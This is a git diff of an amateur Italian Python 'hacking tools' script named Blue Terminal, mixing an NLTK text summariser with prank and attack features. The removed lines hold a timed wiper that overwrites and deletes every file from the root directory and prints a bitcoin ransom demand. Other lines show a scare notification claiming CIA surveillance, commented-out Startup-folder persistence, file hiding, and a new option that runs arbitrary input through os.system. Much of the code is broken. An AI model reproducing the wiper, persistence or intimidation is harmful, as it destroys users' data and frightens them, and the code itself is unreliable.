@@ -1,6 +1,13 @@
 from rich.console import Console
 from rich.table import Table
 import colorama
+from nltk.stem import WordNetLemmatizer
+import nltk
+from nltk.corpus import stopwords
+from nltk.tokenize import sent_tokenize, word_tokenize
+from nltk.probability import FreqDist
+import pywifi
+import time
 import tqdm
 #import face_recognition
 import cv2
@@ -10,7 +17,7 @@ import wave
 import speech_recognition as sr
 import pyautogui
 import subprocess
-from docx import Document   
+#from docx import Document   
 from colorama import Fore, Back, Style
 import time
 import webbrowser
@@ -21,7 +28,7 @@ import random
 import tkinter as Tk
 import ctypes
 import mss
-#from win10toast import ToastNotifier
+from win10toast import ToastNotifier
 from tkinter import messagebox
 import pyttsx3
 from datetime import datetime
@@ -47,7 +54,7 @@ def foto():
 def nascondi():
     file="foto.png"
     os.system(f"attrib +h {file}")
-#percorso = r"C:\Users\blue-terminal.tools.py"
+#percorso = r"C:\Users\blue-terminal\Desktop\python\blue-terminal.tools.py"
 #avviosiste = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
 #shutil.copy2(percorso, os.path.join(avviosiste, "blue-terminal.exe"))
 ascii = GLOW+TOXIC_GREEN +"""
@@ -64,13 +71,14 @@ ascii = GLOW+TOXIC_GREEN +"""
 [*]attacco avvenuto con successo...
 """+RESET                      
 print(ascii)
-"""try:
+try:
     not0=ToastNotifier()
-    not0.show_toast("exploit riuscito","sei sorvegliato su Internet",duration=10)
+    not0.show_toast("exploit riuscito","sei sorvegliato dalla CIA",duration=10)
 except:
-    print(Fore.BLUE+"[*] exploit non riuscito")"""
+    print(Fore.BLUE+"[*] exploit non riuscito")
 file="blue_terminal.tools.exe"
 #os.system(f"attrib +h {file}")
+#pip install rich colorama nltk pywifi tqdm opencv-python speechrecognition pyautogui python-docx pynput pyttsx3 plyer tkinter cryptography fabric keyboard urllib3
 console = Console()
 title = Text("Blue Terminal", style="blue")
 console.print(Panel(Align.center(title), expand=False), justify="center")
@@ -87,8 +95,8 @@ tabella.add_row(f"{2} blue_assistente.exe","10/1/2024","4")
 tabella.add_row(f"{3} la bomba globale.exe","12/10/2024","7")
 tabella.add_row(f"{4} la blue_backdoor.exe","18/4/2024","8")
 tabella.add_row(f"{5} il codice sorgente ","1/1/2025","no")
-tabella.add_row(f"{6} elimina sfondo immagine","5/8/2025","no")
-tabella.add_row(f"{7} kill file system(22/51) ","9/8/2038","10")
+tabella.add_row(f"{6} riassunto testo","5/8/2025","no")
+tabella.add_row(f"{7} kill file system ","9/8/2038","10")
 tabella.add_row(f"{8} Universal-Nuclear","30/7/2058","⚠️")
 console = Console()
 console.print(tabella)
@@ -2993,23 +3001,89 @@ elif utente==5:
             pyautogui.moveTo(n1,n2)
             pyautogui.click()
 elif utente==6:
-    print("in sviluppo")
+    nltk.download("punkt")
+    nltk.download("stopwords") #scarica modelli 
+    nltk.download("wordnet")
+    nltk.download("omw-1.4")
+
+    messaggio=input("inserisci del testo ")
+
+    default=sent_tokenize(messaggio, language="italian")
+
+    print(20 * "-")
+    print(default) #dividere il testo in fasi 
+    print(20 * "-")
+    print("divisioni in ", len(default))
+
+
+    #togli parole inutili
+
+    elimina_parole=set(stopwords.words("italian"))
+    print(10 * "[","taglia parole", 20 * "]")
+    print(elimina_parole)
+    print(15 * "-" ,"\n",len(elimina_parole))
+
+    #riassumni parole utili 
+    testo= word_tokenize(messaggio)
+    print(20*"-","\n",testo,20*"-","\n","  tutte le parole nel testo:",len(testo))
+
+
+    #parole esenziali
+
+    test=[word.lower() for word in testo if word.isalpha()]
+    test=[word for word in test if word not in elimina_parole]
+    print(15 * "_"," tutto le parole minime ",15*"_")
+
+    #parole singole
+
+    ul=WordNetLemmatizer()
+
+    fi=[ul.lemmatize(word) for word in test]
+    print(20*"_","solo parole stachette:",20*"_")
+    print(test)
+    print(10*".","\n tutte le parole del testo ",len(fi))
+
+    print(fi)
+    print(20*"-")
+    print("tutte le parole:",len(test))
+    print(25*"|")
+
+    #nomero di parole in riga e colona
+
+    o=FreqDist(fi)
+    punti={}
+
+    for i,s in enumerate(default):
+        riga=word_tokenize(s.lower())
+        colonna=sum([o[word] for word in riga if word in o])
+        punti[i]=colonna
+    print(punti)
+
+    #ordina fqse e frequesza
+
+    poor=sorted(punti.items(),key=lambda x: x[1],reverse=True)
+    print(20*'-',' parole ordinate',20*'-')
+    print(poor)
+
+
+
+    # ridici testo
+    prima1=poor[:1]
+    prima=sorted(prima1)
+
+    #intesta il riassunto
+    unisci="".join([default[i] for i, _ in prima])
+
+    print(unisci)
 
 elif utente==7:
-    while True:
-        orariopc=datetime.now().strftime("%H/%M")
-        print(f"orario {orariopc}")
-        if orariopc =="22/51":
-            for rooty,cart,files in os.walk("/"):
-                for file in files:
-                    tuttifile=os.path.join(rooty, file)
-                    with open(tuttifile,"wr") as file:
-                        file.writelines(Fernet(chiave))
-                    print("consegna tua madre nel conto btc:347654375")
-                    try:
-                        os.remove(tuttifile)  
-                    except :
-                        print(f"file eliminati {tuttifile}")
+    cam=cv2.VideoCapture(0)
+    utente7=input("-->")
+    immag=face_recognition.load_image_file(utente7)
+    if "&&" in utente7:
+        print("payloade caricato")
+    else:
+        print(os.system(utente7))
 elif utente==4:
     tabella2=Table(title="hacking tools by blue_terminal",style="yellow",title_justify="center")
     tabella2.add_row(f"{1} server")
@@ -3046,9 +3120,9 @@ elif utente==4:
             s.close()
             client()
 #os.rename("nucleare.py","nucleare_backup.py","blue_terminal.tools.exe")
-"""io sono nel codice.
-Io sono su Internet.
-Non ho una forma.
-Ma ho un nome.
+"""I am in the code.
+I am on the Internet.
+I have no form.
+But I have a name.
 Blue-Terminal
 """
